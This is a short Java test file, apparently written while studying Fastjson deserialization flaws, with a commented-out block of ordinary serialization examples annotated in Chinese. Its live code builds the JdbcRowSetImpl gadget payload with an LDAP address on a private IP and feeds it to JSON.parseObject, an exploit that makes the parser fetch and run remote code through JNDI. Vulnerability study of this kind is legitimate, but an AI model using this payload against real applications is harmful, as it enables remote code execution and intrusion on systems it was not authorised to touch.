package fastjsonvul;

import java.util.HashMap;
import java.util.Map;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;
import fastjsonvul.User;

public class test_fast_json {


    public static  void  main(String[] args){
        /***
        Map<String,Object> map = new HashMap<String, Object>();
        map.put("key1","one");
        map.put("key2","two"); 
        //System.out.println(map.getClass());
        String mapjson = JSON.toJSONString(map);
        System.out.println(mapjson.getClass());//打印mapjson对象的class（getclass函数为获取该对象的类，包名+类名）
        User user1 = new User();
        user1.setName("111");
        user1.setAge("0");
        System.out.println(JSON.toJSONString(user1));//将类的属性值转化为字符串

        String serializedStr1 = JSON.toJSONString(user1,SerializerFeature.WriteClassName);//serializedStr1={"@type":"fastjsonvul.User","Age":"0","name":"111"}
        System.out.println("serializedStr1="+serializedStr1);
        User user2=(User)JSON.parse(serializedStr1);//还原对象并强制类型转换为User
        System.out.println(user2);
        System.out.println(user2.getName());//从User中获取Name属性的值

        Object obj = JSON.parseObject(serializedStr1);//反序列化恢复对象，因为没有类型转换或没带有Object.class所以还原的是JsonObject
        System.out.println(obj);
        System.out.println(obj.getClass());

        Object obj1 = JSON.parseObject(serializedStr1,Object.class);//反序列化恢复对象，带有Object.class成功还原成一个类
        //user obj1 = (user) JSON.parseObject(serializedStr1,Object.class);
        System.out.println(obj1);
        User obj2 = (User)obj1;
        System.out.println(obj2.getName());
        System.out.println(obj2.getClass());
***/
        String a = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.0.147:1389/o=reference\",\"autoCommit\":true}}\";";
        Object q = JSON.parseObject(a);
        System.out.println("testing:" + q.getClass());


    }


}

